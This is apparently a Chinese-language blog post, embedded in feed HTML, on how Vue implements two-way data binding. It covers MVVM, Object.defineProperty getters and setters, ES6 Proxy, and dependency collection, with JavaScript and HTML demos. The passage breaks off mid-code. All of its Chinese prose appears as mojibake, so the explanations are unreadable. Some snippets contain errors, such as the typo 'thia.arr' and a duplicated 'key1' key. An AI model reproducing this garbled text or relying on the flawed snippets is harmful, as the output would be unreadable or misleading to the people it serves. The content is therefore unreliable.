      <content type="html"><![CDATA[<h3 id="1-MVVM"><a href="#1-MVVM" class="headerlink" title="1. MVVM"></a>1. MVVM</h3><p>MVVMæ‹†å¼€æ¥å³ä¸ºModel-View-ViewModelï¼Œç”±Viewï¼ŒViewModelï¼ŒModelä¸‰éƒ¨åˆ†ç»„æˆã€‚å®ƒç›®çš„åœ¨äºæ›´æ¸…æ¥šåœ°å°†ç”¨æˆ·ç•Œé¢ï¼ˆUI)çš„å¼€å‘ä¸åº”ç”¨ç¨‹åºä¸­ä¸šåŠ¡é€»è¾‘å’Œè¡Œä¸ºçš„å¼€å‘åŒºåˆ†å¼€æ¥ã€‚</p><p><img src="/2018/11/14/Vueæ•°æ®ç»‘å®š/1.png" style="max-width: 400px"><br><strong>Model</strong><br>æ•°æ®å±‚<br>æ˜¯å¯¹ç°å®ä¸–ç•Œä¸­äº‹ç‰©çš„æŠ½è±¡ç»“æœï¼Œå°±æ˜¯å»ºæ¨¡ã€‚</p><p><strong>View</strong><br>ç”¨æˆ·æ“ä½œç•Œé¢<br>è´Ÿè´£å°†æ•°æ®æ¨¡å‹è½¬åŒ–ä¸ºUIå±•ç°å‡ºæ¥ã€‚</p><p><strong>ViewModal</strong><br>ä¸šåŠ¡é€»è¾‘å±‚<br>Viewéœ€è¦ä»€ä¹ˆæ•°æ®ï¼ŒViewModelè¦æä¾›è¿™ä¸ªæ•°æ®ï¼›Viewæœ‰å“ªäº›äº›æ“ä½œï¼ŒViewModelå°±è¦å“åº”è¿™äº›æ“ä½œ</p><p><br></p><h3 id="2-æ•°æ®é©±åŠ¨"><a href="#2-æ•°æ®é©±åŠ¨" class="headerlink" title="2. æ•°æ®é©±åŠ¨"></a>2. æ•°æ®é©±åŠ¨</h3><p>å¯¹äº View æ¥è¯´ï¼Œå¦‚æœå°è£…å¾—å¥½ï¼Œä¸€ä¸ªUIç»„ä»¶èƒ½å¾ˆæ–¹ä¾¿åœ°ç»™å¤§å®¶å¤ç”¨ã€‚å¯¹äº Model æ¥è¯´ï¼Œå®ƒå…¶å®æ˜¯ç”¨æ¥å­˜å‚¨ä¸šåŠ¡çš„æ•°æ®çš„ï¼Œå¦‚æœåšå¾—å¥½ï¼Œå®ƒä¹Ÿå¯ä»¥æ–¹ä¾¿åœ°å¤ç”¨ã€‚é‚£ä¹ˆï¼ŒViewModelæœ‰å¤šå°‘å¯ä»¥å¤ç”¨ï¼Ÿç»“è®ºæ˜¯ï¼š<em>éå¸¸éš¾å¤ç”¨</em>ã€‚</p><p>ViewModelåšçš„ä»€ä¹ˆï¼Ÿå°±æ˜¯å†™é‚£äº›ä¸èƒ½å¤ç”¨çš„ä¸šåŠ¡ä»£ç ã€‚å½“äº¤äº’å¤æ‚ï¼Œä¸€ä¸ªæ•°æ®çš„æ”¹å˜å¼•èµ·å¤šå¤„DOMçš„ä¿®æ”¹ã€‚ViewModelå°†å˜å¾—<em>ååˆ†è‡ƒè‚¿</em>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'message'</span>).innerHTML = message;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'aboumessage'</span>).innerHTML = message;</span><br><span class="line"><span class="comment">// ... æ›´å¤šå¤æ‚çš„äº¤äº’</span></span><br></pre></td></tr></table></figure></p><p>æ€ä¹ˆç®€åŒ–ViewModelï¼Ÿ<em>æ•°æ®é©±åŠ¨: æ•°æ®çš„å˜æ›´è§¦å‘DOMçš„å˜åŒ–</em>ã€‚<br>æˆ‘ä»¬å¸Œæœ›ï¼Œåªæ‰§è¡Œ<code>this.$data.message = 1</code>å°±å¯ä»¥è§¦å‘ä¸<code>message</code>ç›¸å…³çš„UIæ›´æ–°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$data.message = <span class="number">1</span></span><br></pre></td></tr></table></figure></p><blockquote><p>æ‰€è°“æ•°æ®é©±åŠ¨ï¼Œæ˜¯æŒ‡è§†å›¾æ˜¯ç”±æ•°æ®é©±åŠ¨ç”Ÿæˆçš„ï¼Œæˆ‘ä»¬å¯¹è§†å›¾çš„ä¿®æ”¹ï¼Œä¸ä¼šç›´æ¥æ“ä½œ DOMï¼Œè€Œæ˜¯é€šè¿‡ä¿®æ”¹æ•°æ®ã€‚å®ƒç›¸æ¯”æˆ‘ä»¬ä¼ ç»Ÿçš„å‰ç«¯å¼€å‘ï¼Œå¦‚ä½¿ç”¨ jQuery ç­‰å‰ç«¯åº“ç›´æ¥ä¿®æ”¹ DOMï¼Œå¤§å¤§ç®€åŒ–äº†ä»£ç é‡ã€‚ç‰¹åˆ«æ˜¯å½“äº¤äº’å¤æ‚çš„æ—¶å€™ï¼Œåªå…³å¿ƒæ•°æ®çš„ä¿®æ”¹ä¼šè®©ä»£ç çš„é€»è¾‘å˜çš„éå¸¸æ¸…æ™°ï¼Œå› ä¸º DOM å˜æˆäº†æ•°æ®çš„æ˜ å°„ï¼Œæˆ‘ä»¬æ‰€æœ‰çš„é€»è¾‘éƒ½æ˜¯å¯¹æ•°æ®çš„ä¿®æ”¹ï¼Œè€Œä¸ç”¨ç¢°è§¦ DOMï¼Œè¿™æ ·çš„ä»£ç éå¸¸åˆ©äºç»´æŠ¤ã€‚</p></blockquote><p><br></p><h3 id="3-Object-defineProperty"><a href="#3-Object-defineProperty" class="headerlink" title="3. Object.defineProperty"></a>3. Object.defineProperty</h3><p>Vueå®ç°æ•°æ®é©±åŠ¨çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨äº†ES5çš„Object.definePropertyã€‚</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/definePropert" target="_blank" rel="noopener">Object.defineProperty</a>æ–¹æ³•ä¼šç›´æ¥åœ¨ä¸€ä¸ªå¯¹è±¡ä¸Šå®šä¹‰ä¸€ä¸ªæ–°å±æ€§ï¼Œæˆ–ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„ç°æœ‰å±æ€§ï¼Œå¹¶è¿”å›è¿™ä¸ªå¯¹è±¡ã€‚åˆ©ç”¨ Object.defineProperty ç»™æ•°æ®æ·»åŠ äº† getter å’Œ setterï¼Œå¯ä»¥ä½¿æˆ‘ä»¬åœ¨è®¿é—®æ•°æ®ä»¥åŠå†™æ•°æ®çš„æ—¶å€™èƒ½è‡ªåŠ¨æ‰§è¡Œä¸€äº›é€»è¾‘ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">'text'</span>, &#123;</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">    updateUI();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">obj.text = <span class="number">1</span>; <span class="comment">// ä¼šè§¦å‘updateUI()</span></span><br></pre></td></tr></table></figure><p>Vueé‡‡ç”¨è¿™ç§æ•°æ®åŠ«æŒçš„æ–¹å¼ï¼Œé€šè¿‡Object.defineProperty()æ–¹æ³•æ¥åŠ«æŒ data æ‰€æœ‰å¯¹è±¡çš„ setterï¼Œä½¿å¾—dataå‘ç”Ÿå˜åŠ¨æ—¶èƒ½è‡ªåŠ¨æ‰§è¡Œ é‡æ–°ç¼–è¯‘æ¨¡æ¿ã€‚</p><p><br></p><h4 id="3-1-å®ç°Demo"><a href="#3-1-å®ç°Demo" class="headerlink" title="3.1 å®ç°Demo"></a>3.1 å®ç°Demo</h4><input id="input"><span id="span"></span><script>  const obj = {};  Object.defineProperty(obj, 'text', {    get: function() {    },    set: function(newVal) {      console.log('set val:' + newVal);      document.getElementById('input').value = newVal;      document.getElementById('span').innerHTML = newVal;    }  });  const input = document.getElementById('input');  input.addEventListener('keyup', function(e){    obj.text = e.target.value;  })</script><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"input"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"span"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> obj = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">Object</span>.defineProperty(obj, <span class="string">'text'</span>, &#123;</span></span><br><span class="line"><span class="javascript">    get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(<span class="string">'set val:'</span> + newVal);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'input'</span>).value = newVal;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'span'</span>).innerHTML = newVal;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> input = <span class="built_in">document</span>.getElementById(<span class="string">'input'</span>);</span></span><br><span class="line"><span class="javascript">  input.addEventListener(<span class="string">'keyup'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">    obj.text = e.target.value;</span></span><br><span class="line"><span class="undefined">  &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/14/Vueæ•°æ®ç»‘å®š/3.png"></p><p><br></p><h4 id="3-2-æ£€æŸ¥å˜åŒ–çš„ç¼ºé™·"><a href="#3-2-æ£€æŸ¥å˜åŒ–çš„ç¼ºé™·" class="headerlink" title="3.2 æ£€æŸ¥å˜åŒ–çš„ç¼ºé™·"></a>3.2 æ£€æŸ¥å˜åŒ–çš„ç¼ºé™·</h4><p>å—ç°ä»£JSçš„é™åˆ¶</p><ul><li>Vueä¸å…è®¸åŠ¨æ€æ·»åŠ æ ¹çº§åˆ«çš„å“åº”å¼å±æ€§</li><li><p>Vueæ— æ³•æ£€æµ‹åˆ°å¯¹è±¡å±æ€§çš„æ·»åŠ æˆ–åˆ é™¤<br>ä½ å¯èƒ½éœ€è¦ä¸ºå·²æœ‰å¯¹è±¡èµ‹å€¼å¤šä¸ªæ–°å±æ€§ï¼Œå¦‚<code>Object.assign()</code>æˆ–<code>_.extend()</code>ï¼Œä½†è¿™æ ·æ·»åŠ åˆ°å¯¹è±¡ä¸Šçš„æ–°å±æ€§ä¸ä¼šè§¦å‘æ›´æ–°ã€‚è¿™æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå®ä¾‹æ–¹æ³•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this.$setå®ä¾‹æ–¹æ³•</span></span><br><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.someObject, <span class="string">'b'</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡</span></span><br><span class="line"><span class="keyword">this</span>.someObject = <span class="built_in">Object</span>.assign(&#123;&#125;, <span class="keyword">this</span>.someObject, &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;)</span><br></pre></td></tr></table></figure></li><li><p>Vueä¸èƒ½æ£€æµ‹ä»¥ä¸‹æ•°ç»„çš„å˜åŠ¨ï¼š<br>åˆ©ç”¨ç´¢å¼•ç›´æ¥è®¾ç½®ä¸€ä¸ªæ•°ç»„é¡¹æ—¶<code>vm.items[index] = newVal</code><br>ä¿®æ”¹æ•°ç»„çš„é•¿åº¦æ—¶ <code>vm.items.length = newLen</code><br>Vueå°†è¢«ç›‘å¬çš„æ•°ç»„çš„å˜å¼‚æ–¹æ³•è¿›è¡Œäº†åŒ…è£¹ï¼Œå®ƒä»¬ä¹Ÿå°†ä¼šè§¦å‘è¯•å›¾æ›´æ–°ã€‚è¿™äº›æ–¹æ³•åŒ…æ‹¬push, pop, shift, unshift, splice, sort, reverseã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œä¹Ÿæœ‰éå˜å¼‚æ–¹æ³•ï¼Œå®ƒä»¬ä¸ä¼šæ”¹å˜åŸå§‹æ•°ç»„ï¼Œè€Œæ€»æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„æ•°ç»„ã€‚è¿™æ—¶ï¼Œå¯ä»¥ç”¨æ–°æ•°ç»„æ›¿æ¢æ—§æ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.arr = thia.arr.filter(<span class="function">(<span class="params">item</span>) =&gt;</span> item.key)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-proxy"><a href="#4-proxy" class="headerlink" title="4. proxy"></a>4. proxy</h3><p>åœ¨Vue2.0ä¸­ï¼Œæ•°æ®åŒå‘ç»‘å®šå°±æ˜¯é€šè¿‡<code>Object.defineProperty</code>å»ç›‘å¬å¯¹è±¡çš„æ¯ä¸€ä¸ªå±æ€§ï¼Œç„¶ååœ¨get,setæ–¹æ³•ä¸­é€šè¿‡å‘å¸ƒè®¢é˜…è€…æ¨¡å¼æ¥å®ç°çš„æ•°æ®å“åº”ï¼Œä½†æ˜¯å­˜åœ¨ä¸€å®šçš„ç¼ºé™·ï¼Œæ¯”å¦‚åªèƒ½ç›‘å¬å·²å­˜åœ¨çš„å±æ€§ï¼Œå¯¹äºæ–°å¢åˆ é™¤å±æ€§å°±æ— èƒ½ä¸ºåŠ›äº†ï¼ŒåŒæ—¶æ— æ³•ç›‘å¬æ•°ç»„çš„å˜åŒ–ï¼Œæ‰€ä»¥åœ¨Vue3.0ä¸­å°†å…¶æ¢æˆäº†åŠŸèƒ½æ›´å¼ºå¤§çš„<code>Proxy</code>ã€‚</p><ul><li>Object.definePropertyç›‘å¬çš„æ˜¯å¯¹è±¡çš„æ¯ä¸€ä¸ªå±æ€§ï¼Œè€ŒProxyç›‘å¬çš„æ˜¯å¯¹è±¡è‡ªèº«</li><li>ä½¿ç”¨Object.definePropertyéœ€è¦éå†å¯¹è±¡çš„æ¯ä¸€ä¸ªå±æ€§ï¼Œå¯¹äºæ€§èƒ½ä¼šæœ‰ä¸€å®šçš„å½±å“</li><li>Proxyå¯¹æ–°å¢çš„å±æ€§ä¹Ÿèƒ½ç›‘å¬åˆ°ï¼Œä½†Object.definePropertyæ— æ³•ç›‘å¬åˆ°ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> handler = &#123;</span><br><span class="line">    get: <span class="function">(<span class="params">target, propkey</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`ç›‘å¬åˆ°<span class="subst">$&#123;propkey&#125;</span>è¢«å–å•¦,å€¼ä¸º:<span class="subst">$&#123;target[propkey]&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> target[propkey];</span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function">(<span class="params">target, propkey, value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(target[propkey] !== value)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`ç›‘å¬åˆ°<span class="subst">$&#123;propkey&#125;</span>å˜åŒ–å•¦,å€¼å˜ä¸º:<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">this</span>.data = <span class="keyword">new</span> <span class="built_in">Proxy</span>(<span class="keyword">this</span>.data, handler);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-ä¾èµ–æ”¶é›†"><a href="#5-ä¾èµ–æ”¶é›†" class="headerlink" title="5. ä¾èµ–æ”¶é›†"></a>5. ä¾èµ–æ”¶é›†</h3><p>è¿™çœ‹ä¸Šå»å¾ˆç®€å•ï¼Œä½†æ˜¯å®ƒèƒŒååˆæ½œè—ç€å‡ ä¸ªè¦å¤„ç†çš„é—®é¢˜ï¼š</p><ul><li>æ€æ ·åªæ›´æ–°å’Œ<code>message</code>æœ‰å…³çš„DOM</li><li>ä¸æƒ³åœ¨æ¯ä¸ª setter æ–¹æ³•é‡Œä¸€ä¸ªä¸ªå†™ DOMæ“ä½œ</li><li>dataå¯¹è±¡ ä¸­key: [virtualDom1, virtualDom2, â€¦]ä¸€ä¸€å¯¹åº”ï¼Ÿ</li><li>æ€æ ·ç»Ÿä¸€æ”¶é›†è¿™ä¸ªå¯¹åº”å…³ç³»ï¼Ÿ</li></ul><ul><li>æˆ‘ä»¬çš„æ•°æ®ã€æ–¹æ³•å’ŒDOMéƒ½æ˜¯è€¦åˆåœ¨ä¸€èµ·</li><li>æˆ‘ä»¬åªç›‘å¬äº†ä¸€ä¸ªå±æ€§,ä¸€ä¸ªå¯¹è±¡ä¸å¯èƒ½åªæœ‰ä¸€ä¸ªå±æ€§,æˆ‘ä»¬éœ€è¦å¯¹å¯¹è±¡æ¯ä¸ªå±æ€§è¿›è¡Œç›‘å¬</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; message &#125;&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>æ¨¡æ¿æ¸²æŸ“æ—¶ï¼Œæ¸²æŸ“åˆ°éœ€è¦è¯»å–this.$data.messageçš„å€¼ï¼Œè§¦å‘äº†getterå‡½æ•°ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠmessageè¿™ä¸ªå˜é‡å’Œæ‰€åœ¨çš„å…ƒç´ ç»‘å®šèµ·æ¥ã€‚ä¸€ä¸ªå˜é‡å°±å¯ä»¥å¯¹åº”å¤šä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">  key1: val1,</span><br><span class="line">  key2: val2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Dep = &#123;</span><br><span class="line">  key1: [virtualDom1, virtualDom2, virtualDom3, ...],</span><br><span class="line">  key1: [virtualDom1, virtualDom4, ...],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å½“key1è¢«ä¿®æ”¹æ—¶ï¼Œsetting æ ¹æ® Dep æ‰¾åˆ°è·Ÿkey1ç›¸å¯¹åº”çš„å…ƒç´ ï¼Œåªæ›´æ–°è¿™ä¸€éƒ¨åˆ†çš„UIã€‚</p><p><img src="/2018/11/14/Vueæ•°æ®ç»‘å®š/2.png"></p><p><br></p><h3 id="6-å®ç°MVVM-Demo"><a href="#6-å®ç°MVVM-Demo" class="headerlink" title="6. å®ç°MVVM Demo"></a>6. å®ç°MVVM Demo</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Two-way data-binding<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">        &#123;&#123; text &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">observe</span> (<span class="params">obj, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">Object</span>.keys(obj).forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                defineReactive(vm, key, obj[key]);</span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params">obj, key, val</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dep = <span class="keyword">new</span> Dep();</span></span><br><span class="line"><span class="javascript">            <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span></span><br><span class="line"><span class="javascript">                get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (Dep.target) dep.addSub(Dep.target);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> val</span></span><br><span class="line"><span class="undefined">                &#125;,</span></span><br><span class="line"><span class="javascript">                set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (newVal === val) <span class="keyword">return</span></span></span><br><span class="line"><span class="undefined">                    val = newVal;</span></span><br><span class="line"><span class="undefined">                    dep.notify();</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">nodeToFragment</span> (<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> flag = <span class="built_in">document</span>.createDocumentFragment();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> child;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span> (child = node.firstChild) &#123;</span></span><br><span class="line"><span class="undefined">                compile(child, vm);</span></span><br><span class="line"><span class="undefined">                flag.appendChild(child);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> flag;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">compile</span> (<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// èŠ‚ç‚¹ç±»å‹ä¸ºå…ƒç´ </span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (node.nodeType === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> attr = node.attributes;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// è§£æå±æ€§</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; attr.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (attr[i].nodeName == <span class="string">'v-model'</span>) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> name = attr[i].nodeValue; <span class="comment">// è·å–v-modelç»‘å®šçš„å±æ€§å</span></span></span><br><span class="line"><span class="javascript">                        node.addEventListener(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// ç»™ç›¸åº”çš„dataå±æ€§èµ‹å€¼ï¼Œè¿›è€Œè§¦å‘è¯¥å±æ€§çš„setæ–¹æ³•</span></span></span><br><span class="line"><span class="undefined">                            vm[name] = e.target.value;</span></span><br><span class="line"><span class="undefined">                        &#125;);</span></span><br><span class="line"><span class="javascript">                        node.value = vm[name]; <span class="comment">// å°†dataçš„å€¼èµ‹ç»™è¯¥node</span></span></span><br><span class="line"><span class="javascript">                        node.removeAttribute(<span class="string">'v-model'</span>);</span></span><br><span class="line"><span class="undefined">                    &#125;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">new</span> 